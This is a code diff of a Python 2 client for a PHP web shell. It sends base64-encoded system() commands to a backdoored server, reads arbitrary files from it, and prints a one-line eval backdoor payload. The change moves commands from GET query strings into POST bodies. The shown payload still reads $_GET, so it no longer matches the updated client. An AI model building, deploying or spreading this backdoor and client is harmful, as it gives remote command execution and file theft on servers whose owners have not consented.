@@ -25,14 +25,9 @@ class rshell(Cmd):
     def default(self, line):
         #This is the default command method
         #system function is called with the command to execute
-        s = "system('{0}');".format(line)
-        #building url
-        url = self.shell_url + '?param='
-        #adding base64 encoded parameter
-        #the [:-1] is because encodestring add a \n at the end
-        url += quote_plus(base64.encodestring(s)[:-1])
+        cmd = "system('{0}');".format(line)
         #doing the request to the server
-        (code, response) = self.dorequest(url)
+        (code, response) = self.dorequest(cmd)
         if code == 200:
             print response
 
@@ -42,19 +37,25 @@ class rshell(Cmd):
     def do_exit(self, line):
         exit(0)
 
-    def dorequest(self, fullurl):
+    def dorequest(self, phpcmd):
+        #Post request using the param parameter
+        cmd_base64 = base64.encodestring(phpcmd)[:-1]
+        fullurl = self.shell_url
         parsed_url = urlparse(fullurl)
         url = ''
         con = None
+        params = "param={0}".format(cmd_base64)
         if self.proxy:
             (ip, port) = self.proxy.split(':')
             con = httplib.HTTPConnection(ip, int(port))
             url = fullurl
         else:
-            url = parsed_url.path + '?' + parsed_url.query
+            url = parsed_url.path
             con = httplib.HTTPConnection(parsed_url.netloc, parsed_url.port)
+        headers = {"Content-type": "application/x-www-form-urlencoded",
+                  "Accept": "text/plain"}        
         if con:
-            con.request('GET', url)
+            con.request('POST', url, params, headers)
             response = con.getresponse()
             if response.status == 200:
                 return (response.status, response.read())
@@ -76,22 +77,16 @@ class rshell(Cmd):
         #This is the default command method
         #system function is called with the command to execute
         s = "phpinfo();"
-        #building url
-        url = self.shell_url + '?param='
-        #adding base64 encoded parameter
-        #the [:-1] is because encodestring add a \n at the end
-        url += quote_plus(base64.encodestring(s)[:-1])
         #doing the request to the server
-        self.dorequest(url)
+        self.dorequest(s)
 
     def print_payload(self):
         print "<?php eval(base64_decode($_GET['param'])); ?>"
 
     def do_download(self, line):
         files = line.split()
-        fullurl = self.shell_url + '?param='
-        fullurl += quote_plus(base64.encodestring("echo base64_encode(file_get_contents('{0}'));".format(files[0]))[:-1])
-        (code, data) = self.dorequest(fullurl)
+        cmd = "echo base64_encode(file_get_contents('{0}'));".format(files[0])
+        (code, data) = self.dorequest(cmd)
         if code == 200:
             f = file(os.path.basename(files[0]), "w")
             f.write(base64.decodestring(data))
